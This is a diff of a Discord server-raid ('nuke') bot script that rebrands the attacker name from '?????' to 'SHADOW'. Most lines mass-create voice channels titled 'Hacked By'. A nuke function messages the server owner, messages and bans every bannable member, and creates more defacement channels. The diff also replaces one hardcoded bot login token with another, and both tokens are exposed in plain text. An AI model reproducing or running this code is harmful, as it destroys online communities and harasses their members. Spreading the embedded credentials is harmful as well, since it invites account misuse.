-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-m.createChannel('Hacked By - ?????', 'voice');
-
-
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
+m.createChannel('Hacked By - SHADOW', 'voice');
 
 
 
@@ -1069,14 +2793,14 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked By - ?????    ').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW    ').catch(e => { return void e; });
  
  
  
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('Hacked By - ?????  ').catch(e => { return void e; });
+      await m.send('Hacked By - SHADOW  ').catch(e => { return void e; });
       return m.ban();
     }
   }));
@@ -1088,9 +2812,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked By - ????? ,$', 'text');
+    await guild.createChannel('Hacked By - SHADOW ,$', 'text');
  
-      await guild.createChannel('Hacked By - ???? ,$', 'voice');
+      await guild.createChannel('Hacked By - SHADOW ,$', 'voice');
  
  
  
@@ -1130,4 +2854,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("NDY5NzgxODE1Nzg0MjQzMjAw.DuWvRg.gRpc_Jhlq6JFnLRp6WphvM5VIGs")
+LOka.login("NTMwNzI5NTkxMTYyMDExNjQ4.DxEo1A.vdB2e2wLeYvJvbE0aMCT4v8PDTY")
